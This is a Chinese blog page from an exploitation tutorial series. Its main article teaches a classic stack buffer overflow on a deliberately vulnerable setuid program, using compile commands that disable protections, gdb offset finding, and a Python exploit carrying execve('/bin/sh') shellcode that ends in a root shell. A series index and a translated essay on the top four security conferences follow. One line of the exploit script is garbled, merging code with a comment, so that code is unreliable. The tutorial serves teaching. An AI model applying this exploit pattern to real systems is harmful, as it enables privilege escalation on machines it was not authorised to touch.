-<li>0X03 如何实现任意代码执行</li>
-</ul>
-</blockquote>
-<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
-<p>虽然你能在网上找到很多缓冲区溢出漏洞利用系列教程，但本文肯定是其中最最简单的一篇。尽管内容与其他文章多有重复，并且同类文章已经有了很多，我仍然愿意出一篇独家教程，因为这篇博文将是我后续发布的众多文章的阅读前提。</p>
-<h3 id="0X01-什么是缓冲区溢出（Buffer-Overflow）"><a href="#0X01-什么是缓冲区溢出（Buffer-Overflow）" class="headerlink" title="0X01 什么是缓冲区溢出（Buffer Overflow）"></a>0X01 什么是缓冲区溢出（Buffer Overflow）</h3><p>将源缓冲区复制到目标缓冲区时，以下情况可能导致缓冲区溢出的情况发生：</p>
-<ol>
-<li>源字符串长度大于目标字符串长度</li>
-<li>没有执行缓冲区大小检查</li>
-</ol>
-<p>缓冲区溢出分两类：</p>
-<ol>
-<li>栈缓冲区溢出——此时目标缓冲区存放于栈中</li>
-<li>堆缓冲区溢出——此时目标缓冲区存放于堆中</li>
-</ol>
-<p>这篇文章里，我只讨论栈缓冲区溢出问题。堆缓冲区溢出请参见<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux (x86) 漏洞利用教程系列</a>中的<a href="http://www.csyssec.org/20161230/linux-exploit/#堆漏洞" target="_blank" rel="external">第三部分</a>。</p>
-<p>缓冲区溢出漏洞会导致任意代码执行的发生。</p>
-<h3 id="0X02-什么是任意代码执行（arbitrary-code-execution）"><a href="#0X02-什么是任意代码执行（arbitrary-code-execution）" class="headerlink" title="0X02 什么是任意代码执行（arbitrary code execution）"></a>0X02 什么是任意代码执行（arbitrary code execution）</h3><p>任意代码执行允许攻击者执行代码来获得系统控制权。获得系统控制权的方法有很多，比如触发一个root shell、添加一个新用户、建立一个网络端口等等。</p>
-<p>听起来挺有趣的吧？话不多说，来看一则典型漏洞代码吧！</p>
-<p><u><em>漏洞代码：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u><em>编译命令：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>上述漏洞程序的第[2]行显示，该程序中存在缓冲区溢出漏洞。由于缓冲区内容是用户提供的输入值，因此这个缓冲区溢出漏洞很可能导致系统执行任意代码。</p>
-<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
-<h3 id="0X03-如何实现任意代码执行是如何实现的"><a href="#0X03-如何实现任意代码执行是如何实现的" class="headerlink" title="0X03 如何实现任意代码执行是如何实现的"></a>0X03 如何实现任意代码执行是如何实现的</h3><p>任意代码执行是通过<strong>“返回地址覆盖(Return Address<br> Overwrite)”</strong>技术实现的。这种方法帮助攻击者覆盖掉存储在栈内的返回地址，通过这种覆盖，任意代码执行得以实现。</p>
-<p>为了让大家更好地理解漏洞利用代码，我们在对它做进一步的分析之前，先来反汇编并画出漏洞代码的堆栈布局图吧！</p>
-<p><u><em>反汇编：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">   <span class="comment">//Function Prologue</span></div><div class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	push   %ebp                      <span class="comment">//backup caller's ebp</span></div><div class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	mov    %esp,%ebp                 <span class="comment">//set callee's ebp to esp</span></div><div class="line"></div><div class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	and    $<span class="number">0xfffffff0</span>,%esp          <span class="comment">//stack alignment</span></div><div class="line">   <span class="number">0x0804841a</span> &lt;+<span class="number">6</span>&gt;:	sub    $<span class="number">0x110</span>,%esp               <span class="comment">//stack space for local variables</span></div><div class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	mov    <span class="number">0xc</span>(%ebp),%eax            <span class="comment">//eax = argv</span></div><div class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">15</span>&gt;:	add    $<span class="number">0x4</span>,%eax                 <span class="comment">//eax = &amp;argv[1]</span></div><div class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">18</span>&gt;:	mov    (%eax),%eax               <span class="comment">//eax = argv[1]</span></div><div class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">20</span>&gt;:	mov    %eax,<span class="number">0x4</span>(%esp)            <span class="comment">//strcpy arg2 </span></div><div class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">24</span>&gt;:	lea    <span class="number">0x10</span>(%esp),%eax           <span class="comment">//eax = 'buf' </span></div><div class="line">   <span class="number">0x08048430</span> &lt;+<span class="number">28</span>&gt;:	mov    %eax,(%esp)               <span class="comment">//strcpy arg1</span></div><div class="line">   <span class="number">0x08048433</span> &lt;+<span class="number">31</span>&gt;:	call   <span class="number">0x8048330</span> &lt;<span class="built_in">strcpy</span>@plt&gt;    <span class="comment">//call strcpy</span></div><div class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">36</span>&gt;:	mov    $<span class="number">0x8048530</span>,%eax           <span class="comment">//eax = format str "Input:%s\n"</span></div><div class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	lea    <span class="number">0x10</span>(%esp),%edx           <span class="comment">//edx = buf</span></div><div class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	mov    %edx,<span class="number">0x4</span>(%esp)            <span class="comment">//printf arg2</span></div><div class="line">   <span class="number">0x08048445</span> &lt;+<span class="number">49</span>&gt;:	mov    %eax,(%esp)               <span class="comment">//printf arg1</span></div><div class="line">   <span class="number">0x08048448</span> &lt;+<span class="number">52</span>&gt;:	call   <span class="number">0x8048320</span> &lt;<span class="built_in">printf</span>@plt&gt;    <span class="comment">//call printf</span></div><div class="line">   <span class="number">0x0804844d</span> &lt;+<span class="number">57</span>&gt;:	mov    $<span class="number">0x0</span>,%eax                 <span class="comment">//return value 0</span></div><div class="line"></div><div class="line">   <span class="comment">//Function Epilogue</span></div><div class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">62</span>&gt;:	leave                            <span class="comment">//mov ebp, esp; pop ebp; </span></div><div class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">63</span>&gt;:	ret                              <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u><em>堆栈布局：</em></u></p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/level1stacklayout.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/level1stacklayout.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>根据已有知识，用户输入值大小超过256时会溢出目标缓冲区，并且覆盖存储于栈中的返回地址。让我们来通过发送一串“A”的方法进行测试。</p>
-<p>测试第一步： 是否会覆盖返回地址？</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*300'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*300'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>上述输出结果显示，EIP被“AAAAA”覆盖了，这就意味着返回地址被覆盖是有可能的!!</p>
-<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
-<p>现在我们来找找目标缓冲区‘buf’中返回地址的偏移处于什么位置。<br>之前我们已经反汇编并画了main()的堆栈布局，那么现在就试着找出代码的偏移位置信息吧！由堆栈布局可以看出，返回地址偏移位于目标缓冲区buf的(0x10c)处。(0x10c)计算方式如下</p>
-<pre><code>0X04 0x10c = 0x100 + 0x8 + 0x4
-</code></pre><p>其中：</p>
-<ul>
-<li>0X100 是‘buf’大小</li>
-<li>0x8 是对齐空间</li>
-<li>0x4 是调用者的EBP</li>
-</ul>
-<p>这样一来，用户输入“A” <em> 268 + “B” </em> 4中，一串“A”覆盖‘buf’、对齐空间和调用者的EBP，“BBBB”覆盖返回地址。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>上述输出结果表明攻击者已经获得返回地址的控制权。位于栈 (0xbffff1fc)的返回地址已经被“BBBB”覆盖了。有了这些信息，我们就可以写出能实现任意代码执行的漏洞利用代码了。</p>
-<p><u><em>漏洞利用代码：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py </span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = <span class="number">0xbffff1d0</span>       </div><div class="line">              </div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numnk + RA + NOP's + Shellcode</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">100</span></div><div class="line">buf += scode</div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
-<p>执行上述漏洞利用程序就可以获取root shell，如下所示：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������<span class="number">1</span>�Ph<span class="comment">//shh/bin��P��S���</span></div><div class="line"></div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure></p>
-<p><u><em>注意：</em></u>为了得到这个root shell，我们舍弃了很多exploit的mitigation方法。其实在整个系列的<a href="http://www.csyssec.org/20161230/linux-exploit/#基本漏洞" target="_blank" rel="external">第一部分</a>，我都特意没用这些exploit的mitigation方法，因为level 1的目标，仅止于普及漏洞知识。如果你真的想学到有意思的知识，就去看<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux (x86)漏洞利用教程系列</a>的<a href="http://www.csyssec.org/20161230/linux-exploit/#绕过漏洞利用缓解-Exploit-Mitigation-技术" target="_blank" rel="external">第二部分</a>吧！到时候我会教你们如何绕过exploit的mitigation方法。</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-经典栈缓冲区溢出</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Overflow/">Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-linux-exploit"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161230/linux-exploit/">Linux(X86)漏洞利用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20161230/linux-exploit/" class="article-date">
-	  <time datetime="2016-12-30T07:52:28.000Z" itemprop="datePublished">十二月 30, 2016</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSyssec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux(X86)漏洞利用系列</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<h3 id="0X01-基本漏洞"><a href="#0X01-基本漏洞" class="headerlink" title="0X01 基本漏洞"></a>0X01 基本漏洞</h3><ul>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">整型溢出利用</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">基于栈的off-by-one</a></li>
-</ul>
-<h3 id="0X02-绕过漏洞利用缓解-Exploit-Mitigation-技术"><a href="#0X02-绕过漏洞利用缓解-Exploit-Mitigation-技术" class="headerlink" title="0X02 绕过漏洞利用缓解(Exploit Mitigation)技术"></a>0X02 绕过漏洞利用缓解(Exploit Mitigation)技术</h3><ul>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">链接return-to-libc绕过NX</a></li>
-<li>绕过ASLR<ul>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">Return-to-ptl</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">暴力破解</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">GOT覆盖与GOT解引用</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="0X03-堆漏洞"><a href="#0X03-堆漏洞" class="headerlink" title="0X03 堆漏洞"></a>0X03 堆漏洞</h3><ul>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">Unlink堆溢出</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">Malloc Maleficarum堆溢出</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">基于堆的off-by-one</a></li>
-<li><a href="http://www.csyssec.org/" target="_blank" rel="external">释放后再使用(Use After Free)</a></li>
-</ul>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux(X86)漏洞利用系列</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-csysseccircus"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161230/csysseccircus/">计算机系统安全学术圈</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20161230/csysseccircus/" class="article-date">
-	  <time datetime="2016-12-30T05:37:07.000Z" itemprop="datePublished">十二月 30, 2016</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<figure><br>    <a href="http://s3.eurecom.fr/~balzarot/" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/davide.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p><strong>CSysSec注</strong>: 本文受欧洲通信学院(EURECOM)教授<a href="http://s3.eurecom.fr/~balzarot/" target="_blank" rel="external">Davide Balzarotti</a>建议翻译（原文链接：<a href="http://s3.eurecom.fr/~balzarot/notes/top4/" target="_blank" rel="external">System Security Circus</a>），并受邀将译文放至其主页，供更多中国学生阅读。Balzarotti教授研究领域为系统安全方向，更多关注二进制与恶意代码分析，逆向工程，计算机取证与Web安全。其在CCS,Usenix Security,ACSAC等著名安全会议发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/csysseccircus/" target="_blank" rel="external">计算机系统安全学术圈</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p>本文是对之前帖子（<a href="http://s3.eurecom.fr/~balzarot/notes/top4_v1/" target="_blank" rel="external">点此查看</a>）的重大更新，增加了系统安全领域TOP4顶级会议的数据。</p>
-<h3 id="现今版本：2-1-0"><a href="#现今版本：2-1-0" class="headerlink" title="现今版本：2.1.0"></a>现今版本：2.1.0</h3><p>(重大更新是指增加新的数据或结点，次要更新是指对个别数据的修改，对于输入错误和书写错误的修改也会导致版本更新)</p>
-<h3 id="最新动态"><a href="#最新动态" class="headerlink" title="最新动态"></a>最新动态</h3><blockquote>
-<ul>
-<li>更多的数据：此版收录了17年的文章，较之前一版在总量上增加了40%。</li>
-<li>4种模式的<a href="http://s3.eurecom.fr/~balzarot/notes/top4/affiliations.html" target="_blank" rel="external">作者单位列表</a>：全球版、美国版、欧洲版、其他地区版</li>
-<li>排名前10%作者的所属单位已经精致制图，包含详细信息和历史出版信息热图（参看<a href="http://s3.eurecom.fr/~balzarot/notes/top4/info/97.html" target="_blank" rel="external">这个</a>ETH Zurich的例子）</li>
-<li><a href="http://s3.eurecom.fr/~balzarot/notes/top4/authors.html" target="_blank" rel="external">作者</a>信息页新增活动年份分栏</li>
-<li>包含更多的图表和数据</li>
-</ul>
-</blockquote>
-<h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>本数据集包括了自<strong>2000</strong>年以来发表在<strong>ACM CCS</strong>, <strong>Usenix Security</strong>, IEEE Security&amp; Privacy (<strong>Oakland</strong>)和<strong>NDSS</strong>会议上的所有论文。上述四个会议（经常被称作TOP4的会议）每年定期举办并紧密连成周期，也就是当一个会议投稿即将结束时，下一个会议的通知就会发出。（我仍然需要单独发一篇帖子来说明这种方式的弊端）<br>如果你是第一次阅读本文，请注意以下几点：</p>
-<ul>
-<li><p><strong>数据集具有代表性吗？</strong><br>我认为具有代表性。CCS，Oakland，Usenix Security和NDSS是系统安全领域内的四个顶级会议，我想本领域内的每个人都会与我看法一致。但是，这四个会议也不是唯一的标准。也有其他具有较长历史的好会议（例如，ACSAC）；同时，其他领域的顶级会议也会收录系统安全的相关文章。但是，我认为TOP4会议是帮助我们把握系统安全研究、了解领域内研究群体的最好选择。<br>当然，这其中有些会议（主要是CCS和Oakland）是安全领域的主要会议，包括了密码学和应用密码学的文章。这会带来分析结果的偏差，但是我想我们要接受他们的存在，我也不会人为地从数据集中删除非系统类的文章。<br>本数据集包含了这些会议17年来的文章。我有想过将数据集增加，但是并不认为这是一个好主意。NDSS在上世纪90年代是顶级会议吗？</p>
-</li>
-<li><p><strong>数据集完整吗？</strong><br>我认为完整的数据集并不存在。我从这些会议的网站上收集到了所有的信息，其中作者单位不全的，我采用人工的方式下载了对应的PDF文章，补全所有信息。这一过程一定存在粘贴复制的错误（既有我的失误也有会议网站管理员的失误）。此外，我发现有时会议工作人员在制定会议手册时直接采用了投稿的文章标题，而该文章在后期发表中可能更换了标题。<br>许多作者的名字都含有非ASCII字符，因而在不同的文章中拼写不一致。因此，我将所有名字都翻译成近似ASCII字符来显示。但是，ASCII字符表示法也存在一些问题，例如“Xin Cheng Zhang”、“Xin C. Zhang”和“Xin Zhang”（看上去）表示的是同一个人吗？还有一些难以解决的：那些省略中间名或者在不同文章中采用不同名字的人（例如，Srinivas 或 Srini, Chris 或 Christopher, Mike 或Michael, Sal 或 Salvatore, Yoshi 或 Tadayoshi,等）。有些人喜欢随意使用非ASCII字符、缩写、不同的拼写等，导致每篇文章署名都不同。<br>更糟糕的是难以察觉的拼写错误（例如“Herbert”写成“Hebert”）。<br>我写了脚本来应对以上现象，同时也将查出的错误进行了人工修改。但是我找到了所有的错误吗？我想并没有，并且我确定我自己也可能会出错，但是我尽可能的确保正确。<br>最后，作者的单位非常混乱。简单的问题，例如“UC”和“University of California”很容易修复。有时候有些作者添加了实验室或院系的名称，我则需要手动搜索查询，进一步确定是否是同一家机构。最后，公司方面的名称更加复杂。我尽可能将不通过家的分公司加以区分（例如IBM India与T.J. Watson进行区分）。但有些时候这也非常困难，我想我还是在整理中出现了个别错误。</p>
-</li>
-</ul>
-<p>所以</p>
-<pre><code>简言之，数据集中存在不准确的数据和有问题的代码。想想天气预报：人们只能尽可能去准确预测，结果也并非随机，但是却不能确保完美。 
-</code></pre><h3 id="群体大小与投稿数量"><a href="#群体大小与投稿数量" class="headerlink" title="群体大小与投稿数量"></a>群体大小与投稿数量</h3><p>截至目前，本数据集共包括来自<strong>51</strong>个不同国家<strong>699</strong>个单位的<strong>4460</strong>名学者在<strong>68</strong>个会议上发表的<strong>2675</strong>篇文章。首先让我们来看一下投稿的数量。在本学术圈里，人们最常听到的就是TOP4会议的投稿人数逐年增加而发表文章变得越来越难。<br>那么我们首先来看这一言论是否属实：</p>
-<figure class="half"><br>    <a href="http://oij0laovn.bkt.clouddn.com/1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/1.png" width="450"></a><br>    <a href="http://oij0laovn.bkt.clouddn.com/2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/2.png" width="450"></a><br></figure>
-
-<p>这些图表明确呈现出以下两个特征:一是投稿数量激增，甚至不只是线性变化！然而右图显示文章的接收率并没有下降，这些会议主席们为保障接收率（个人认为在10%-20%）确实做出了不懈努力。<br>然而这样的结果也是有代价的：所有TOP4会议的规模都在扩大而每篇文章的展示时间却在缩短。不幸的是，扩大会议规模只是暂时的解决方案并不能解决核心问题。个人认为，增加一个顶级会议（例如<strong>Euro S&amp;P</strong>正在考虑实施的办法）可能会有效缓解目前的困境。但前提是，这一会议是用来分流而不是引发圈内的新一轮竞争。另一个解决方式是像WWW一样，（利用分会议）实现多轨并行，但是目前来看没有安全领域的会议朝这个方向发展。<br>接下来，让我们看一下都有哪些人在投稿。图表给人的总体感觉是系统安全学术圈在扩张。然而，这可能是系统安全领域出现了更多研究团队，或者主要的研究团队在扩张，进而他们的投稿越来越多。</p>
